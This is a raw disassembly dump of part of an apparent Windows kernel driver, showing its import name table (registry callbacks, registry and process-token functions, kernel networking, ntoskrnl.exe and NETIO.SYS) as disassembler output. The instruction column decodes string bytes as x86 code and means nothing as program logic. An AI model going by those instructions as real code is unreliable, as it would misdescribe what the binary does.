  412617:	76 65                	jbe    0x41267e
  412619:	43                   	inc    %ebx
  41261a:	72 69                	jb     0x412685
  41261c:	74 69                	je     0x412687
  41261e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  412621:	52                   	push   %edx
  412622:	65 67 69 6f 6e 00 5b 	imul   $0x50075b00,%gs:0x6e(%bx),%ebp
  412629:	07 50 
  41262b:	73 54                	jae    0x412681
  41262d:	65 72 6d             	gs jb  0x41269d
  412630:	69 6e 61 74 65 53 79 	imul   $0x79536574,0x61(%esi),%ebp
  412637:	73 74                	jae    0x4126ad
  412639:	65 6d                	gs insl (%dx),%es:(%edi)
  41263b:	54                   	push   %esp
  41263c:	68 72 65 61 64       	push   $0x64616572
  412641:	00 c8                	add    %cl,%al
  412643:	04 4b                	add    $0x4b,%al
  412645:	65 53                	gs push %ebx
  412647:	65 74 42             	gs je  0x41268c
  41264a:	61                   	popa
  41264b:	73 65                	jae    0x4126b2
  41264d:	50                   	push   %eax
  41264e:	72 69                	jb     0x4126b9
  412650:	6f                   	outsl  %ds:(%esi),(%dx)
  412651:	72 69                	jb     0x4126bc
  412653:	74 79                	je     0x4126ce
  412655:	54                   	push   %esp
  412656:	68 72 65 61 64       	push   $0x64616572
  41265b:	00 8f 0b 73 70 72    	add    %cl,0x7270730b(%edi)
  412661:	69 6e 74 66 00 57 00 	imul   $0x570066,0x74(%esi),%ebp
  412668:	43                   	inc    %ebx
  412669:	6d                   	insl   (%dx),%es:(%edi)
  41266a:	55                   	push   %ebp
  41266b:	6e                   	outsb  %ds:(%esi),(%dx)
  41266c:	52                   	push   %edx
  41266d:	65 67 69 73 74 65 72 	imul   $0x61437265,%gs:0x74(%bp,%di),%esi
  412674:	43 61 
  412676:	6c                   	insb   (%dx),%es:(%edi)
  412677:	6c                   	insb   (%dx),%es:(%edi)
  412678:	62 61 63             	bound  %esp,0x63(%ecx)
  41267b:	6b 00 00             	imul   $0x0,(%eax),%eax
  41267e:	54                   	push   %esp
  41267f:	00 43 6d             	add    %al,0x6d(%ebx)
  412682:	52                   	push   %edx
  412683:	65 67 69 73 74 65 72 	imul   $0x61437265,%gs:0x74(%bp,%di),%esi
  41268a:	43 61 
  41268c:	6c                   	insb   (%dx),%es:(%edi)
  41268d:	6c                   	insb   (%dx),%es:(%edi)
  41268e:	62 61 63             	bound  %esp,0x63(%ecx)
  412691:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  412695:	00 4d 00             	add    %cl,0x0(%ebp)
  412698:	43                   	inc    %ebx
  412699:	6d                   	insl   (%dx),%es:(%edi)
  41269a:	43                   	inc    %ebx
  41269b:	61                   	popa
  41269c:	6c                   	insb   (%dx),%es:(%edi)
  41269d:	6c                   	insb   (%dx),%es:(%edi)
  41269e:	62 61 63             	bound  %esp,0x63(%ecx)
  4126a1:	6b 47 65 74          	imul   $0x74,0x65(%edi),%eax
  4126a5:	4b                   	dec    %ebx
  4126a6:	65 79 4f             	gs jns 0x4126f8
  4126a9:	62 6a 65             	bound  %ebp,0x65(%edx)
  4126ac:	63 74 49 44          	arpl   %esi,0x44(%ecx,%ecx,2)
  4126b0:	00 00                	add    %al,(%eax)
  4126b2:	5d                   	pop    %ebp
  4126b3:	05 4d 6d 49 73       	add    $0x73496d4d,%eax
  4126b8:	41                   	inc    %ecx
  4126b9:	64 64 72 65          	fs fs jb 0x412722
  4126bd:	73 73                	jae    0x412732
  4126bf:	56                   	push   %esi
  4126c0:	61                   	popa
  4126c1:	6c                   	insb   (%dx),%es:(%edi)
  4126c2:	69 64 00 00 99 0b 73 	imul   $0x74730b99,0x0(%eax,%eax,1),%esp
  4126c9:	74 
  4126ca:	72 6c                	jb     0x412738
  4126cc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4126ce:	00 00                	add    %al,(%eax)
  4126d0:	9c                   	pushf
  4126d1:	0b 73 74             	or     0x74(%ebx),%esi
  4126d4:	72 6e                	jb     0x412744
  4126d6:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  4126d9:	00 9d 0b 73 74 72    	add    %bl,0x7274730b(%ebp)
  4126df:	6e                   	outsb  %ds:(%esi),(%dx)
  4126e0:	63 70 79             	arpl   %esi,0x79(%eax)
  4126e3:	00 b0 0b 77 63 73    	add    %dh,0x7363770b(%eax)
  4126e9:	63 61 74             	arpl   %esp,0x74(%ecx)
  4126ec:	00 00                	add    %al,(%eax)
  4126ee:	b7 0b                	mov    $0xb,%bh
  4126f0:	77 63                	ja     0x412755
  4126f2:	73 6c                	jae    0x412760
  4126f4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4126f6:	00 00                	add    %al,(%eax)
  4126f8:	ba 0b 77 63 73       	mov    $0x7363770b,%edx
  4126fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4126fe:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  412701:	00 43 08             	add    %al,0x8(%ebx)
  412704:	52                   	push   %edx
  412705:	74 6c                	je     0x412773
  412707:	49                   	dec    %ecx
  412708:	6e                   	outsb  %ds:(%esi),(%dx)
  412709:	69 74 41 6e 73 69 53 	imul   $0x74536973,0x6e(%ecx,%eax,2),%esi
  412710:	74 
  412711:	72 69                	jb     0x41277c
  412713:	6e                   	outsb  %ds:(%esi),(%dx)
  412714:	67 00 93 0b 73       	add    %dl,0x730b(%bp,%di)
  412719:	74 72                	je     0x41278d
  41271b:	63 61 74             	arpl   %esp,0x74(%ecx)
  41271e:	00 00                	add    %al,(%eax)
  412720:	96                   	xchg   %eax,%esi
  412721:	0b 73 74             	or     0x74(%ebx),%esi
  412724:	72 63                	jb     0x412789
  412726:	6d                   	insl   (%dx),%es:(%edi)
  412727:	70 00                	jo     0x412729
  412729:	00 9a 0b 73 74 72    	add    %bl,0x7274730b(%edx)
  41272f:	6e                   	outsb  %ds:(%esi),(%dx)
  412730:	63 61 74             	arpl   %esp,0x74(%ecx)
  412733:	00 a2 0b 73 74 72    	add    %ah,0x7274730b(%edx)
  412739:	73 74                	jae    0x4127af
  41273b:	72 00                	jb     0x41273d
  41273d:	00 96 00 45 78 41    	add    %dl,0x41784500(%esi)
  412743:	63 71 75             	arpl   %esi,0x75(%ecx)
  412746:	69 72 65 53 70 69 6e 	imul   $0x6e697053,0x65(%edx),%esi
  41274d:	4c                   	dec    %esp
  41274e:	6f                   	outsl  %ds:(%esi),(%dx)
  41274f:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  412752:	78 63                	js     0x4127b7
  412754:	6c                   	insb   (%dx),%es:(%edi)
  412755:	75 73                	jne    0x4127ca
  412757:	69 76 65 00 00 29 01 	imul   $0x1290000,0x65(%esi),%esi
  41275e:	45                   	inc    %ebp
  41275f:	78 52                	js     0x4127b3
  412761:	65 6c                	gs insb (%dx),%es:(%edi)
  412763:	65 61                	gs popa
  412765:	73 65                	jae    0x4127cc
  412767:	53                   	push   %ebx
  412768:	70 69                	jo     0x4127d3
  41276a:	6e                   	outsb  %ds:(%esi),(%dx)
  41276b:	4c                   	dec    %esp
  41276c:	6f                   	outsl  %ds:(%esi),(%dx)
  41276d:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  412770:	78 63                	js     0x4127d5
  412772:	6c                   	insb   (%dx),%es:(%edi)
  412773:	75 73                	jne    0x4127e8
  412775:	69 76 65 00 00 b4 0b 	imul   $0xbb40000,0x65(%esi),%esi
  41277c:	77 63                	ja     0x4127e1
  41277e:	73 63                	jae    0x4127e3
  412780:	70 79                	jo     0x4127fb
  412782:	00 00                	add    %al,(%eax)
  412784:	7c 07                	jl     0x41278d
  412786:	52                   	push   %edx
  412787:	74 6c                	je     0x4127f5
  412789:	41                   	inc    %ecx
  41278a:	6e                   	outsb  %ds:(%esi),(%dx)
  41278b:	73 69                	jae    0x4127f6
  41278d:	53                   	push   %ebx
  41278e:	74 72                	je     0x412802
  412790:	69 6e 67 54 6f 55 6e 	imul   $0x6e556f54,0x67(%esi),%ebp
  412797:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
  41279e:	72 69                	jb     0x412809
  4127a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4127a1:	67 00 00             	add    %al,(%bx,%si)
  4127a4:	11 08                	adc    %ecx,(%eax)
  4127a6:	52                   	push   %edx
  4127a7:	74 6c                	je     0x412815
  4127a9:	46                   	inc    %esi
  4127aa:	72 65                	jb     0x412811
  4127ac:	65 55                	gs push %ebp
  4127ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4127af:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
  4127b6:	72 69                	jb     0x412821
  4127b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4127b9:	67 00 00             	add    %al,(%bx,%si)
  4127bc:	b8 07 52 74 6c       	mov    $0x6c745207,%eax
  4127c1:	43                   	inc    %ebx
  4127c2:	72 65                	jb     0x412829
  4127c4:	61                   	popa
  4127c5:	74 65                	je     0x41282c
  4127c7:	53                   	push   %ebx
  4127c8:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4127cc:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
  4127d3:	72 
  4127d4:	69 70 74 6f 72 00 f6 	imul   $0xf600726f,0x74(%eax),%esi
  4127db:	08 52 74             	or     %dl,0x74(%edx)
  4127de:	6c                   	insb   (%dx),%es:(%edi)
  4127df:	53                   	push   %ebx
  4127e0:	65 74 44             	gs je  0x412827
  4127e3:	61                   	popa
  4127e4:	63 6c 53 65          	arpl   %ebp,0x65(%ebx,%edx,2)
  4127e8:	63 75 72             	arpl   %esi,0x72(%ebp)
  4127eb:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
  4127f2:	72 
  4127f3:	69 70 74 6f 72 00 00 	imul   $0x726f,0x74(%eax),%esi
  4127fa:	bb 04 4b 65 52       	mov    $0x52654b04,%ebx
  4127ff:	65 73 65             	gs jae 0x412867
  412802:	74 45                	je     0x412849
  412804:	76 65                	jbe    0x41286b
  412806:	6e                   	outsb  %ds:(%esi),(%dx)
  412807:	74 00                	je     0x412809
  412809:	00 57 04             	add    %dl,0x4(%edi)
  41280c:	4b                   	dec    %ebx
  41280d:	65 49                	gs dec %ecx
  41280f:	6e                   	outsb  %ds:(%esi),(%dx)
  412810:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  412817:	65 
  412818:	54                   	push   %esp
  412819:	69 6d 65 72 45 78 00 	imul   $0x784572,0x65(%ebp),%ebp
  412820:	dc 04 4b             	faddl  (%ebx,%ecx,2)
  412823:	65 53                	gs push %ebx
  412825:	65 74 54             	gs je  0x41287c
  412828:	69 6d 65 72 45 78 00 	imul   $0x784572,0x65(%ebp),%ebp
  41282f:	00 b4 06 50 73 43 72 	add    %dh,0x72437350(%esi,%eax,1)
  412836:	65 61                	gs popa
  412838:	74 65                	je     0x41289f
  41283a:	53                   	push   %ebx
  41283b:	79 73                	jns    0x4128b0
  41283d:	74 65                	je     0x4128a4
  41283f:	6d                   	insl   (%dx),%es:(%edi)
  412840:	54                   	push   %esp
  412841:	68 72 65 61 64       	push   $0x64616572
  412846:	00 00                	add    %al,(%eax)
  412848:	5f                   	pop    %edi
  412849:	0a 5a 77             	or     0x77(%edx),%bl
  41284c:	43                   	inc    %ebx
  41284d:	72 65                	jb     0x4128b4
  41284f:	61                   	popa
  412850:	74 65                	je     0x4128b7
  412852:	4b                   	dec    %ebx
  412853:	65 79 00             	gs jns 0x412856
  412856:	a0 0a 5a 77 4f       	mov    0x4f775a0a,%al
  41285b:	70 65                	jo     0x4128c2
  41285d:	6e                   	outsb  %ds:(%esi),(%dx)
  41285e:	4b                   	dec    %ebx
  41285f:	65 79 00             	gs jns 0x412862
  412862:	80 0a 5a             	orb    $0x5a,(%edx)
  412865:	77 46                	ja     0x4128ad
  412867:	6c                   	insb   (%dx),%es:(%edi)
  412868:	75 73                	jne    0x4128dd
  41286a:	68 4b 65 79 00       	push   $0x79654b
  41286f:	00 de                	add    %bl,%dh
  412871:	0a 5a 77             	or     0x77(%edx),%bl
  412874:	51                   	push   %ecx
  412875:	75 65                	jne    0x4128dc
  412877:	72 79                	jb     0x4128f2
  412879:	56                   	push   %esi
  41287a:	61                   	popa
  41287b:	6c                   	insb   (%dx),%es:(%edi)
  41287c:	75 65                	jne    0x4128e3
  41287e:	4b                   	dec    %ebx
  41287f:	65 79 00             	gs jns 0x412882
  412882:	16                   	push   %ss
  412883:	0b 5a 77             	or     0x77(%edx),%ebx
  412886:	53                   	push   %ebx
  412887:	65 74 56             	gs je  0x4128e0
  41288a:	61                   	popa
  41288b:	6c                   	insb   (%dx),%es:(%edi)
  41288c:	75 65                	jne    0x4128f3
  41288e:	4b                   	dec    %ebx
  41288f:	65 79 00             	gs jns 0x412892
  412892:	ef                   	out    %eax,(%dx)
  412893:	05 4e 74 51 75       	add    $0x7551744e,%eax
  412898:	65 72 79             	gs jb  0x412914
  41289b:	49                   	dec    %ecx
  41289c:	6e                   	outsb  %ds:(%esi),(%dx)
  41289d:	66 6f                	outsw  %ds:(%esi),(%dx)
  41289f:	72 6d                	jb     0x41290e
  4128a1:	61                   	popa
  4128a2:	74 69                	je     0x41290d
  4128a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4128a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4128a6:	54                   	push   %esp
  4128a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4128a8:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  4128ac:	98                   	cwtl
  4128ad:	08 52 74             	or     %dl,0x74(%edx)
  4128b0:	6c                   	insb   (%dx),%es:(%edi)
  4128b1:	4c                   	dec    %esp
  4128b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4128b4:	67 74 68             	addr16 je 0x41291f
  4128b7:	53                   	push   %ebx
  4128b8:	69 64 00 00 a5 07 52 	imul   $0x745207a5,0x0(%eax,%eax,1),%esp
  4128bf:	74 
  4128c0:	6c                   	insb   (%dx),%es:(%edi)
  4128c1:	43                   	inc    %ebx
  4128c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4128c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4128c4:	76 65                	jbe    0x41292b
  4128c6:	72 74                	jb     0x41293c
  4128c8:	53                   	push   %ebx
  4128c9:	69 64 54 6f 55 6e 69 	imul   $0x63696e55,0x6f(%esp,%edx,2),%esp
  4128d0:	63 
  4128d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4128d2:	64 65 53             	fs gs push %ebx
  4128d5:	74 72                	je     0x412949
  4128d7:	69 6e 67 00 00 b1 07 	imul   $0x7b10000,0x67(%esi),%ebp
  4128de:	52                   	push   %edx
  4128df:	74 6c                	je     0x41294d
  4128e1:	43                   	inc    %ebx
  4128e2:	72 65                	jb     0x412949
  4128e4:	61                   	popa
  4128e5:	74 65                	je     0x41294c
  4128e7:	41                   	inc    %ecx
  4128e8:	63 6c 00 00          	arpl   %ebp,0x0(%eax,%eax,1)
  4128ec:	6b 07 52             	imul   $0x52,(%edi),%eax
  4128ef:	74 6c                	je     0x41295d
  4128f1:	41                   	inc    %ecx
  4128f2:	64 64 41             	fs fs inc %ecx
  4128f5:	63 63 65             	arpl   %esp,0x65(%ebx)
  4128f8:	73 73                	jae    0x41296d
  4128fa:	41                   	inc    %ecx
  4128fb:	6c                   	insb   (%dx),%es:(%edi)
  4128fc:	6c                   	insb   (%dx),%es:(%edi)
  4128fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4128fe:	77 65                	ja     0x412965
  412900:	64 41                	fs inc %ecx
  412902:	63 65 00             	arpl   %esp,0x0(%ebp)
  412905:	00 f9                	add    %bh,%cl
  412907:	08 52 74             	or     %dl,0x74(%edx)
  41290a:	6c                   	insb   (%dx),%es:(%edi)
  41290b:	53                   	push   %ebx
  41290c:	65 74 4f             	gs je  0x41295e
  41290f:	77 6e                	ja     0x41297f
  412911:	65 72 53             	gs jb  0x412967
  412914:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  412918:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
  41291f:	72 
  412920:	69 70 74 6f 72 00 21 	imul   $0x2100726f,0x74(%eax),%esi
  412927:	07                   	pop    %es
  412928:	50                   	push   %eax
  412929:	73 4c                	jae    0x412977
  41292b:	6f                   	outsl  %ds:(%esi),(%dx)
  41292c:	6f                   	outsl  %ds:(%esi),(%dx)
  41292d:	6b 75 70 50          	imul   $0x50,0x70(%ebp),%esi
  412931:	72 6f                	jb     0x4129a2
  412933:	63 65 73             	arpl   %esp,0x73(%ebp)
  412936:	73 42                	jae    0x41297a
  412938:	79 50                	jns    0x41298a
  41293a:	72 6f                	jb     0x4129ab
  41293c:	63 65 73             	arpl   %esp,0x73(%ebp)
  41293f:	73 49                	jae    0x41298a
  412941:	64 00 00             	add    %al,%fs:(%eax)
  412944:	32 06                	xor    (%esi),%al
  412946:	4f                   	dec    %edi
  412947:	62 4f 70             	bound  %ecx,0x70(%edi)
  41294a:	65 6e                	outsb  %gs:(%esi),(%dx)
  41294c:	4f                   	dec    %edi
  41294d:	62 6a 65             	bound  %ebp,0x65(%edx)
  412950:	63 74 42 79          	arpl   %esi,0x79(%edx,%eax,2)
  412954:	50                   	push   %eax
  412955:	6f                   	outsl  %ds:(%esi),(%dx)
  412956:	69 6e 74 65 72 00 a7 	imul   $0xa7007265,0x74(%esi),%ebp
  41295d:	0a 5a 77             	or     0x77(%edx),%bl
  412960:	4f                   	dec    %edi
  412961:	70 65                	jo     0x4129c8
  412963:	6e                   	outsb  %ds:(%esi),(%dx)
  412964:	50                   	push   %eax
  412965:	72 6f                	jb     0x4129d6
  412967:	63 65 73             	arpl   %esp,0x73(%ebp)
  41296a:	73 54                	jae    0x4129c0
  41296c:	6f                   	outsl  %ds:(%esi),(%dx)
  41296d:	6b 65 6e 45          	imul   $0x45,0x6e(%ebp),%esp
  412971:	78 00                	js     0x412973
  412973:	00 0f                	add    %cl,(%edi)
  412975:	0b 5a 77             	or     0x77(%edx),%ebx
  412978:	53                   	push   %ebx
  412979:	65 74 53             	gs je  0x4129cf
  41297c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  412980:	69 74 79 4f 62 6a 65 	imul   $0x63656a62,0x4f(%ecx,%edi,2),%esi
  412987:	63 
  412988:	74 00                	je     0x41298a
  41298a:	e4 06                	in     $0x6,%al
  41298c:	50                   	push   %eax
  41298d:	73 47                	jae    0x4129d6
  41298f:	65 74 50             	gs je  0x4129e2
  412992:	72 6f                	jb     0x412a03
  412994:	63 65 73             	arpl   %esp,0x73(%ebp)
  412997:	73 49                	jae    0x4129e2
  412999:	6d                   	insl   (%dx),%es:(%edi)
  41299a:	61                   	popa
  41299b:	67 65 46             	addr16 gs inc %esi
  41299e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4129a5:	00 
  4129a6:	32 0b                	xor    (%ebx),%cl
  4129a8:	5f                   	pop    %edi
  4129a9:	61                   	popa
  4129aa:	6c                   	insb   (%dx),%es:(%edi)
  4129ab:	6c                   	insb   (%dx),%es:(%edi)
  4129ac:	6d                   	insl   (%dx),%es:(%edi)
  4129ad:	75 6c                	jne    0x412a1b
  4129af:	00 26                	add    %ah,(%esi)
  4129b1:	07                   	pop    %es
  4129b2:	50                   	push   %eax
  4129b3:	73 50                	jae    0x412a05
  4129b5:	72 6f                	jb     0x412a26
  4129b7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4129ba:	73 54                	jae    0x412a10
  4129bc:	79 70                	jns    0x412a2e
  4129be:	65 00 7e 09          	add    %bh,%gs:0x9(%esi)
  4129c2:	53                   	push   %ebx
  4129c3:	65 45                	gs inc %ebp
  4129c5:	78 70                	js     0x412a37
  4129c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4129c8:	72 74                	jb     0x412a3e
  4129ca:	73 00                	jae    0x4129cc
  4129cc:	95                   	xchg   %eax,%ebp
  4129cd:	0b 73 74             	or     0x74(%ebx),%esi
  4129d0:	72 63                	jb     0x412a35
  4129d2:	68 72 00 00 9e       	push   $0x9e000072
  4129d7:	0b 73 74             	or     0x74(%ebx),%esi
  4129da:	72 6e                	jb     0x412a4a
  4129dc:	63 70 79             	arpl   %esi,0x79(%eax)
  4129df:	5f                   	pop    %edi
  4129e0:	73 00                	jae    0x4129e2
  4129e2:	82 05 4d 6d 50 72 6f 	addb   $0x6f,0x72506d4d
  4129e9:	62 65 41             	bound  %esp,0x41(%ebp)
  4129ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4129ed:	64 4c                	fs dec %esp
  4129ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4129f0:	63 6b 50             	arpl   %ebp,0x50(%ebx)
  4129f3:	61                   	popa
  4129f4:	67 65 73 00          	addr16 gs jae 0x4129f8
  4129f8:	99                   	cltd
  4129f9:	05 4d 6d 55 6e       	add    $0x6e556d4d,%eax
  4129fe:	6c                   	insb   (%dx),%es:(%edi)
  4129ff:	6f                   	outsl  %ds:(%esi),(%dx)
  412a00:	63 6b 50             	arpl   %ebp,0x50(%ebx)
  412a03:	61                   	popa
  412a04:	67 65 73 00          	addr16 gs jae 0x412a08
  412a08:	94                   	xchg   %eax,%esp
  412a09:	02 49 6f             	add    0x6f(%ecx),%cl
  412a0c:	41                   	inc    %ecx
  412a0d:	6c                   	insb   (%dx),%es:(%edi)
  412a0e:	6c                   	insb   (%dx),%es:(%edi)
  412a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  412a10:	63 61 74             	arpl   %esp,0x74(%ecx)
  412a13:	65 4d                	gs dec %ebp
  412a15:	64 6c                	fs insb (%dx),%es:(%edi)
  412a17:	00 ea                	add    %ch,%dl
  412a19:	02 49 6f             	add    0x6f(%ecx),%cl
  412a1c:	46                   	inc    %esi
  412a1d:	72 65                	jb     0x412a84
  412a1f:	65 4d                	gs dec %ebp
  412a21:	64 6c                	fs insb (%dx),%es:(%edi)
  412a23:	00 76 03             	add    %dh,0x3(%esi)
  412a26:	49                   	dec    %ecx
  412a27:	6f                   	outsl  %ds:(%esi),(%dx)
  412a28:	52                   	push   %edx
  412a29:	65 75 73             	gs jne 0x412a9f
  412a2c:	65 49                	gs dec %ecx
  412a2e:	72 70                	jb     0x412aa0
  412a30:	00 00                	add    %al,(%eax)
  412a32:	6e                   	outsb  %ds:(%esi),(%dx)
  412a33:	74 6f                	je     0x412aa4
  412a35:	73 6b                	jae    0x412aa2
  412a37:	72 6e                	jb     0x412aa7
  412a39:	6c                   	insb   (%dx),%es:(%edi)
  412a3a:	2e 65 78 65          	cs js,pn 0x412aa3
  412a3e:	00 00                	add    %al,(%eax)
  412a40:	31 09                	xor    %ecx,(%ecx)
  412a42:	52                   	push   %edx
  412a43:	74 6c                	je     0x412ab1
  412a45:	55                   	push   %ebp
  412a46:	6e                   	outsb  %ds:(%esi),(%dx)
  412a47:	77 69                	ja     0x412ab2
  412a49:	6e                   	outsb  %ds:(%esi),(%dx)
  412a4a:	64 00 27             	add    %ah,%fs:(%edi)
  412a4d:	02 57 73             	add    0x73(%edi),%dl
  412a50:	6b 52 65 67          	imul   $0x67,0x65(%edx),%edx
  412a54:	69 73 74 65 72 00 24 	imul   $0x24007265,0x74(%ebx),%esi
  412a5b:	02 57 73             	add    0x73(%edi),%dl
  412a5e:	6b 43 61 70          	imul   $0x70,0x61(%ebx),%eax
  412a62:	74 75                	je     0x412ad9
  412a64:	72 65                	jb     0x412acb
  412a66:	50                   	push   %eax
  412a67:	72 6f                	jb     0x412ad8
  412a69:	76 69                	jbe    0x412ad4
  412a6b:	64 65 72 4e          	fs gs jb 0x412abd
  412a6f:	50                   	push   %eax
  412a70:	49                   	dec    %ecx
  412a71:	00 28                	add    %ch,(%eax)
  412a73:	02 57 73             	add    0x73(%edi),%dl
  412a76:	6b 52 65 6c          	imul   $0x6c,0x65(%edx),%edx
  412a7a:	65 61                	gs popa
  412a7c:	73 65                	jae    0x412ae3
  412a7e:	50                   	push   %eax
  412a7f:	72 6f                	jb     0x412af0
  412a81:	76 69                	jbe    0x412aec
  412a83:	64 65 72 4e          	fs gs jb 0x412ad5
  412a87:	50                   	push   %eax
  412a88:	49                   	dec    %ecx
  412a89:	00 25 02 57 73 6b    	add    %ah,0x6b735702
  412a8f:	44                   	inc    %esp
  412a90:	65 72 65             	gs jb  0x412af8
  412a93:	67 69 73 74 65 72 00 	imul   $0x4e007265,0x74(%bp,%di),%esi
  412a9a:	4e 
  412a9b:	45                   	inc    %ebp
  412a9c:	54                   	push   %esp
  412a9d:	49                   	dec    %ecx
  412a9e:	4f                   	dec    %edi
  412a9f:	2e 53                	cs push %ebx
  412aa1:	59                   	pop    %ecx
  412aa2:	53                   	push   %ebx
  412aa3:	00 09                	add    %cl,(%ecx)
  412aa5:	04 4b                	add    $0x4b,%al
  412aa7:	65 42                	gs inc %edx
  412aa9:	75 67                	jne    0x412b12
  412aab:	43                   	inc    %ebx
  412aac:	68 65 63 6b 45       	push   $0x456b6365
  412ab1:	78 00                	js     0x412ab3
  412ab3:	00 5b 00             	add    %bl,0x0(%ebx)
  412ab6:	4b                   	dec    %ebx
  412ab7:	65 47                	gs inc %edi
  412ab9:	65 74 43             	gs je  0x412aff
  412abc:	75 72                	jne    0x412b30
  412abe:	72 65                	jb     0x412b25
  412ac0:	6e                   	outsb  %ds:(%esi),(%dx)
  412ac1:	74 49                	je     0x412b0c
  412ac3:	72 71                	jb     0x412b36
  412ac5:	6c                   	insb   (%dx),%es:(%edi)
  412ac6:	00 00                	add    %al,(%eax)
  412ac8:	48                   	dec    %eax
  412ac9:	41                   	inc    %ecx
  412aca:	4c                   	dec    %esp
  412acb:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  412ace:	6c                   	insb   (%dx),%es:(%edi)
  412acf:	00 ae 07 52 74 6c    	add    %ch,0x6c745207(%esi)
  412ad5:	43                   	inc    %ebx
  412ad6:	6f                   	outsl  %ds:(%esi),(%dx)
  412ad7:	70 79                	jo     0x412b52
  412ad9:	55                   	push   %ebp
  412ada:	6e                   	outsb  %ds:(%esi),(%dx)
  412adb:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
  412ae2:	72 69                	jb     0x412b4d
  412ae4:	6e                   	outsb  %ds:(%esi),(%dx)
  412ae5:	67 00 00             	add    %al,(%bx,%si)
  412ae8:	08 00                	or     %al,(%eax)
  412aea:	57                   	push   %edi
  412aeb:	64 66 56             	fs push %si
  412aee:	65 72 73             	gs jb  0x412b64
  412af1:	69 6f 6e 55 6e 62 69 	imul   $0x69626e55,0x6e(%edi),%ebp
  412af8:	6e                   	outsb  %ds:(%esi),(%dx)
  412af9:	64 00 00             	add    %al,%fs:(%eax)
  412afc:	06                   	push   %es
  412afd:	00 57 64             	add    %dl,0x64(%edi)
  412b00:	66 56                	push   %si
  412b02:	65 72 73             	gs jb  0x412b78
  412b05:	69 6f 6e 42 69 6e 64 	imul   $0x646e6942,0x6e(%edi),%ebp
  412b0c:	00 00                	add    %al,(%eax)
  412b0e:	07                   	pop    %es
  412b0f:	00 57 64             	add    %dl,0x64(%edi)
  412b12:	66 56                	push   %si
  412b14:	65 72 73             	gs jb  0x412b8a
  412b17:	69 6f 6e 42 69 6e 64 	imul   $0x646e6942,0x6e(%edi),%ebp
  412b1e:	43                   	inc    %ebx
  412b1f:	6c                   	insb   (%dx),%es:(%edi)
  412b20:	61                   	popa
  412b21:	73 73                	jae    0x412b96
  412b23:	00 09                	add    %cl,(%ecx)
  412b25:	00 57 64             	add    %dl,0x64(%edi)
  412b28:	66 56                	push   %si
  412b2a:	65 72 73             	gs jb  0x412ba0
  412b2d:	69 6f 6e 55 6e 62 69 	imul   $0x69626e55,0x6e(%edi),%ebp
  412b34:	6e                   	outsb  %ds:(%esi),(%dx)
  412b35:	64 43                	fs inc %ebx
  412b37:	6c                   	insb   (%dx),%es:(%edi)
  412b38:	61                   	popa
  412b39:	73 73                	jae    0x412bae
  412b3b:	00 57 44             	add    %dl,0x44(%edi)
  412b3e:	46                   	inc    %esi
  412b3f:	4c                   	dec    %esp
  412b40:	44                   	inc    %esp
  412b41:	52                   	push   %edx
  412b42:	2e 53                	cs push %ebx
  412b44:	59                   	pop    %ecx
  412b45:	53                   	push   %ebx
	...
